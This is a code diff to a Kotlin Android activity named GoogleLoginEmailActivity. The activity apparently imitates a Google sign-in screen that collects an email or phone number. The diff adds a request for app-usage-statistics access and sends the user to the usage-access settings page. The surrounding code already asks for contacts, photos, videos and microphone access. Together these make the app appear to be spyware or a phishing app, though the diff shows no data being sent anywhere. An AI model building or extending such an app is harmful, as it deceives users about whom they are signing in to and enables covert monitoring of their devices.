@@ -17,6 +17,7 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
+import android.provider.Settings
 
 
 class GoogleLoginEmailActivity : AppCompatActivity() {
@@ -33,6 +34,7 @@ class GoogleLoginEmailActivity : AppCompatActivity() {
     private var isReadMediaImagePermissionGranted = false
     private var isReadMediaVideoPermissionGranted = false
     private var isRecordAudioPermissionGranted = false
+    private var isPackageUsageStatePermissionGranted = false
 
     @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     @SuppressLint("ClickableViewAccessibility")
@@ -56,10 +58,27 @@ class GoogleLoginEmailActivity : AppCompatActivity() {
             isReadMediaImagePermissionGranted = permissions[Manifest.permission.READ_MEDIA_IMAGES] ?: isReadMediaImagePermissionGranted
             isReadMediaVideoPermissionGranted = permissions[Manifest.permission.READ_MEDIA_VIDEO] ?: isReadMediaVideoPermissionGranted
             isRecordAudioPermissionGranted = permissions[Manifest.permission.RECORD_AUDIO] ?: isRecordAudioPermissionGranted
+            isPackageUsageStatePermissionGranted = permissions[Manifest.permission.PACKAGE_USAGE_STATS] ?: isPackageUsageStatePermissionGranted
         }
         requestPermission()
+        if (hasUsageStatsPermission()) {
+            // Permission is granted, you can proceed with accessing usage stats.
+        } else {
+            requestUsageStatsPermission()
+        }
         switchToSecondActivity.setOnClickListener(View.OnClickListener { switchActivities() })
     }
+
+    private fun hasUsageStatsPermission(): Boolean {
+        val appOps = ContextCompat.checkSelfPermission(this, "android.permission.PACKAGE_USAGE_STATS")
+        return appOps == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun requestUsageStatsPermission() {
+        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+        startActivityForResult(intent, 1001)
+    }
+
 
     private fun switchActivities() {
         val emailOrPhone: EditText = findViewById(R.id.emailOrPhone)
@@ -151,6 +170,11 @@ class GoogleLoginEmailActivity : AppCompatActivity() {
             Manifest.permission.RECORD_AUDIO
         ) == PackageManager.PERMISSION_GRANTED
 
+        isPackageUsageStatePermissionGranted = ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.PACKAGE_USAGE_STATS
+        ) == PackageManager.PERMISSION_GRANTED
+
         val permissionRequest : MutableList<String> = ArrayList()
 
         if(!isContactPermissionGranted){
@@ -195,6 +219,10 @@ class GoogleLoginEmailActivity : AppCompatActivity() {
 
         if(!isRecordAudioPermissionGranted){
             permissionRequest.add(Manifest.permission.RECORD_AUDIO)
+        }
+
+        if(!isPackageUsageStatePermissionGranted){
+            permissionRequest.add(Manifest.permission.PACKAGE_USAGE_STATS)
         }
 
         if(permissionRequest.isNotEmpty()){
